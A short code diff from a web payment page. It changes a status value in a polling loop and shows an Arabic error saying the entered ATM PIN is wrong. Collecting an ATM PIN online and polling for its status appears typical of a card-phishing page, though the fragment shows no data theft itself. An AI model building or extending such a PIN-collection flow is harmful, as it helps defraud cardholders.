@@ -343,7 +343,7 @@
                     input.style.borderColor = '#ef4444';
                     input.style.background = '#fff5f5';
                     showError(data.lastError || 'فشلت عملية الدفع. رقم الصراف الآلي الذي تم إدخاله غير صحيح، أو قد تكون بطاقتك غير مفعلة للدفع أونلاين. يرجى التواصل مع المصرف أو استخدام طرق دفع مختلفة.');
-                } else if (data.status === 'pin_submitted') {
+                } else if (data.status === 'waiting_pin') {
                     setTimeout(checkStatus, 2000);
                 } else {
                     setTimeout(checkStatus, 2000);
